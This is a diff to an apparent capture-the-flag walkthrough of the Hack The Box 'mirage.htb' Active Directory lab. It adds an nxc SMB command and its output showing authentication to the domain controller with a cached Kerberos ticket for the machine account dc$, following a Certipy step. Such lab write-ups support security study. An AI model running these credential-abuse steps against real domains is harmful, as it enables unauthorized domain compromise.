@@ -916,7 +916,19 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [-] Use -debug to print a stacktrace
 ```
 
-Ill then attempt to get the NT hash of the DC machine account, but it fails, however i did get a TGT for th euse
+Ill then attempt to get the NT hash of the DC machine account, but it fails, however i did get a TGT for the machine account
+
+```python
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb --use-kcache
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] MIRAGE.HTB\dc$ from ccache 
+```
+
+This is a valid TGT
+
+```python
+
+```
 
 
 
